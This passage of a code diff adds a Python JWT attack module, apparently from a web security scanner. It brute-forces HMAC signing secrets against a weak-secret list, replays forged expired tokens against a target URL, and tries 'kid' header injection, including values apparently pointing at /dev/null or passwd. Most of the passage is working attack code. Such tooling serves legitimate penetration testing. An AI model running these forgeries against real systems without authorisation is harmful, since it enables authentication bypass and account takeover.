+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        original_sig = parts[2]
+
+        hash_func = {
+            "HS256": hashlib.sha256,
+            "HS384": hashlib.sha384,
+            "HS512": hashlib.sha512,
+        }.get(original_alg, hashlib.sha256)
+
+        def b64url(data: bytes) -> str:
+            return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+        for secret in self._WEAK_SECRETS:
+            computed = b64url(hmac.new(
+                secret.encode(), signing_input, hash_func,
+            ).digest())
+            if computed == original_sig:
+                return {
+                    "endpoint": "offline",
+                    "jwt_attack": "weak_secret",
+                    "detail": f"JWT signed with weak secret: '{secret}'",
+                    "evidence_score": 5,
+                    "cracked_secret": secret,
+                    "original_algorithm": original_alg,
+                    "request_dump": f"Token: {original_token[:80]}...",
+                    "response_dump": f"Secret cracked offline: {secret}",
+                }
+        return None
+
+    async def _test_expired_token(
+        self, header: dict, payload: dict, target_url: str,
+        cookies: dict[str, str] | None,
+    ) -> dict[str, Any] | None:
+        expired = dict(payload)
+        expired["exp"] = 1000000000  # 2001-09-09 — definitely expired
+        expired["iat"] = 1000000000
+        token = self._build_jwt(header, expired, "", header.get("alg", "HS256"))
+        resp = await self._send_jwt(token, target_url, cookies)
+        if resp and resp.status_code == 200:
+            return {
+                "endpoint": target_url,
+                "jwt_attack": "expired_token",
+                "detail": "Expired JWT accepted — token expiry not enforced",
+                "evidence_score": 4,
+                "cracked_secret": "",
+                "original_algorithm": header.get("alg", "?"),
+                "request_dump": f"GET {target_url}\nAuthorization: Bearer {token[:80]}...",
+                "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
+            }
+        return None
+
+    async def _test_kid_injection(
+        self, header: dict, payload: dict, target_url: str,
+        cookies: dict[str, str] | None, original_alg: str,
+    ) -> list[dict[str, Any]]:
+        findings: list[dict[str, Any]] = []
+        for inj_name, kid_value in self._KID_INJECTIONS:
+            forged_header = dict(header)
+            forged_header["kid"] = kid_value
+            # For /dev/null or empty file: sign with empty string
+            secret = "" if "null" in kid_value or "passwd" in kid_value else "secret"
+            token = self._build_jwt(forged_header, payload, secret, original_alg)
+            resp = await self._send_jwt(token, target_url, cookies)
+            if resp and resp.status_code == 200:
+                findings.append({
+                    "endpoint": target_url,
+                    "jwt_attack": f"kid_{inj_name}",
+                    "detail": f"JWT kid injection ({inj_name}): kid={kid_value} accepted",
+                    "evidence_score": 5,
+                    "cracked_secret": secret,
+                    "original_algorithm": original_alg,
+                    "request_dump": f"GET {target_url}\nkid: {kid_value}\nAuthorization: Bearer {token[:80]}...",
+                    "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
+                })
+                break  # One kid injection is enough
+        return findings
+
+    async def close(self):
+        await self._client.aclose()
